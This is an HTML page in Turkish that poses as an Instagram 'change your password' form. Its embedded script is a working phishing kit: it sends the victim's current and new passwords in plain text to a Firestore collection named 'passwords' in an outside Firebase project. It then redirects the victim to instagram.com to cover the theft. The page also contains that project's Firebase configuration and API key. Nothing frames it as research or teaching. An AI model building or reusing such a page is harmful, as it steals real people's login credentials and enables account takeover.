<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Şifre Yenile</title>
    <script src="https://cdn.tailwindcss.com?client"></script>
    <style>
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #000000; /* Kara renk */
            font-size: 12px;
            font-weight: 600;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
            alt="Instagram Logo"
            class="mx-auto mb-6 w-44"
        />
        <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
            Instagram'da güçlü bir şifre oluşturun
        </h2>
        <p class="text-sm text-gray-600 mb-4 text-center">
            Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (! vb.) oluşmalıdır.
        </p>
        <form id="passwordForm">
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="currentPassword"
                    placeholder="Mevcut Şifre"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="currentPassword">Göster</span>
            </div>
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="newPassword"
                    placeholder="Yeni Şifre"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="newPassword">Göster</span>
            </div>
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="confirmPassword"
                    placeholder="Şifreyi Tekrar Et"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="confirmPassword">Göster</span>
            </div>
            <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
            <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
                Şifreniz değiştirildi!
            </p>
            <button
                type="submit"
                class="w-full bg-blue-500 text-white p-3 rounded-md font-semibold hover:bg-blue-600 transition duration-200"
            >
                Şifreyi Değiştir
            </button>
            <div class="text-center mt-4">
                <a href="#" class="text-blue-500 text-sm hover:underline">Şifrenizi unuttunuz?</a>
            </div>
        </form>
    </div>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';

        const firebaseConfig = {
            apiKey: "AIzaSyC-QALot6Wp5_mVe4s3ekB8JWq-qDUUOqQ",
            authDomain: "premiumstore-adece.firebaseapp.com",
            projectId: "premiumstore-adece",
            storageBucket: "premiumstore-adece.firebasestorage.app",
            messagingSenderId: "1058991155256",
            appId: "1:1058991155256:web:942e3aaa544570355f9ecd",
            measurementId: "G-2SCDNF8S2R"
        };

        // Firebase-i başlat
        let db;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            console.log("Firestore uğurla başladı");
        } catch (error) {
            console.error("Firebase başlama xətası:", error);
        }

        // Göstər/Gizlə funksiyası
        document.querySelectorAll('.toggle-password').forEach(toggle => {
            toggle.addEventListener('click', () => {
                const targetId = toggle.getAttribute('data-target');
                const input = document.getElementById(targetId);
                if (input.type === 'password') {
                    input.type = 'text';
                    toggle.textContent = 'Gizle';
                } else {
                    input.type = 'password';
                    toggle.textContent = 'Göster';
                }
            });
        });

        const form = document.getElementById('passwordForm');
        const currentPassword = document.getElementById('currentPassword');
        const newPassword = document.getElementById('newPassword');
        const confirmPassword = document.getElementById('confirmPassword');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorMessage.classList.add('hidden');
            successMessage.classList.add('hidden');

            if (newPassword.value.length < 6) {
                errorMessage.textContent = 'Yeni şifre en az 6 karakter olmalıdır.';
                errorMessage.classList.remove('hidden');
                return;
            }

            if (newPassword.value !== confirmPassword.value) {
                errorMessage.textContent = 'Yeni şifre ile tekrar şifre aynı değil.';
                errorMessage.classList.remove('hidden');
                return;
            }

            try {
                // Mevcut şifre ve yeni şifreyi Firestore'a metin olarak yaz
                const docRef = await addDoc(collection(db, 'passwords'), {
                    currentPassword: currentPassword.value,
                    newPassword: newPassword.value,
                    timestamp: new Date().toISOString()
                });
                console.log("Şifreler Firestore'a yazıldı, belge ID:", docRef.id);
                successMessage.textContent = 'Şifreniz değiştirildi!';
                successMessage.classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 2000); // 2 saniye sonra Instagram'a yönlendir
            } catch (error) {
                console.error("Firestore'a yazı hatası:", error);
            }
        });
    </script>
</body>
</html>
